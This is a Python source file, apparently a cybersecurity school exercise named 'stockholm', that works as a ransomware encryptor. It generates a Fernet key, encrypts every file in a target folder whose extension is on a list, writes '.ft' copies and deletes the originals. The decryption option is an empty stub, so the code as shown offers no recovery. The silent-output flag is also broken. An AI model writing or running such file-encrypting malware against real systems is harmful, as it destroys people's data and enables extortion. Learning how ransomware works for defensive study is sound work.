import argparse
import sys
import secrets
import logging
import os.path
from cryptography.fernet import Fernet

PATH_FILE_KEY="./.key"
# PATH_INFECTION_FOLDER="/home/infection/"
PATH_INFECTION_FOLDER="/home/adrian/42cursus/cybersecurity_piscine/stockholm/ressources/"
PATH_EXTENSION_LIST="./extension_list.txt"

silent_output = False

def	parse_args():
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group(required=False)
	group.add_argument("-v", "--version", action="store_true", dest="version",
					help="Show the version of the program")
	group.add_argument("-s", "--silent", action="store_true", dest="silent",
					help="Silent the terminal output of the program")
	group.add_argument("-r", "--reverse", dest="reverse", nargs=1, metavar="KEY",
					help="Reverse the malware infection using encryption key")
	args = parser.parse_args()
	return args

def	print_version():
	print("stockholm version 1.0")
#-------------------------------------------------------------------------------------------------#

def	reverse_stockholm():
	return 0

#-------------------------------------------------------------------------------------------------#
		
def	create_key_file(key, path):
	with open(path, 'wb') as file:
		file.write(key)

def	generate_key():
	key = Fernet.generate_key()
	return key

def	read_hexa_key(path):
	with open(path, 'rb') as file:
		key = file.read()
	return key

def	get_key():
	if (os.path.isfile(PATH_FILE_KEY)):
		key = read_hexa_key(PATH_FILE_KEY)
	else:
		key = generate_key()
		create_key_file(key, PATH_FILE_KEY)
	return key

def	check_file_extension(filename, file_extension_list):
	file_name, file_extension = os.path.splitext(filename)
	if (file_extension in file_extension_list):
		return True
	else:
		return False
	
def	init_file_extension_list():
	with open(PATH_EXTENSION_LIST, 'r') as file:
		extensions = file.readlines()
		extensions = [ext.strip() for ext in extensions]
	return extensions

def	encrypt_files(key):
	fernet = Fernet(key)
	file_extension_list = init_file_extension_list()

	for filename in os.listdir(PATH_INFECTION_FOLDER):
		filename = PATH_INFECTION_FOLDER + filename
		if (not check_file_extension(filename, file_extension_list)):
			continue
	
		# encrypt data
		with open(filename, 'rb') as file:
			original_content = file.read()
		encrypted_content = fernet.encrypt(original_content)

		# save encrypted data in .ft file
		with open(filename + ".ft", 'wb') as encrypted_file:
			encrypted_file.write(encrypted_content)
		
		# delete clear file
		os.remove(filename)

		if (silent_output):
			print("Encrypted file:", filename)

def	stockholm():
	key = get_key()
	encrypt_files(key)

#-------------------------------------------------------------------------------------------------#

def	main():
	try:
		args = parse_args()
		silent_output = args.silent
		if (args.version):
			print_version()
		elif (args.reverse):
			reverse_stockholm()
		else:
			stockholm()

	except Exception as e:
		logging.error("An error occurred.", exc_info=True)	
		sys.exit(2)
	return 0

if __name__ == "__main__":
	main()
